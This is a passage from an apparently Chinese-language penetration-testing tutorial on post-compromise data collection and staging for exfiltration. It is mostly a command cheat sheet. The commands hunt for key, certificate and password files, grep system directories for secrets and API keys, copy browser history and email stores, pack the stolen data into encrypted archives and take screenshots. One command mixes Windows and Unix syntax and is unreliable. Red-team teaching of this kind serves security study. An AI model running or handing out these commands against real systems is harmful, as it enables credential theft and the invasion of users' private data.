# 数据收集与外传

### 6.1 数据收集技术

```
数据收集分类：

1. 主机信息收集
   ├── 系统配置
   ├── 已安装软件
   ├── 网络配置
   ├── 用户列表
   └── 安全配置

2. 敏感文件收集
   ├── 文档文件 (.doc, .pdf, .xls)
   ├── 配置文件 (.conf, .ini, .xml)
   ├── 数据库文件 (.db, .sqlite, .mdf)
   ├── 源代码文件
   ├── 压缩文件
   └── 加密密钥

3. 凭证收集
   ├── 密码文件
   ├── SSH密钥
   ├── 证书文件
   ├── Kerberos票据
   └── API令牌

4. 通信数据收集
   ├── 邮件数据
   ├── 即时通讯记录
   ├── 浏览历史
   └── 网络凭据

5. 监控数据收集
   ├── 屏幕截图
   ├── 键盘记录
   ├── 剪贴板内容
   └── 网络流量
```

#### 数据收集命令

```bash
# 1. 搜索敏感文件
find / -name "*.pdf" -o -name "*.doc" -o -name "*.xls" -o -name "*.conf" 2>/dev/null
find / -name "*.kdbx" -o -name "*.key" -o -name "*.pem" -o -name "*.pfx" 2>/dev/null

# 2. 搜索密码文件
find / -name "pass*" -o -name "cred*" -o -name "*.pem" -o -name "*.key" 2>/dev/null
grep -ri "password\|passwd\|secret\|api_key" /etc/ /opt/ /var/www/ 2>/dev/null | head -50

# 3. 收集浏览器数据
# Chrome历史
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History" .
# Chrome书签
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks" .
# Firefox数据
copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default*\places.sqlite" .

# 4. 收集邮件数据
# Outlook OST/PST
dir /s C:\Users\*.ost C:\Users\*.pst
# Thunderbird
copy -r ~/.thunderbird/ .

# 5. 数据打包
# Windows
7z a -p密码 data.7z C:\Sensitive\
# Linux
tar czf - /sensitive/ | openssl enc -aes-256-cbc -out data.tar.gz.enc -k password

# 6. 屏幕截图
# Windows
nircmd.exe savescreenshot screenshot.png
# Linux
import -window root screenshot.png
```
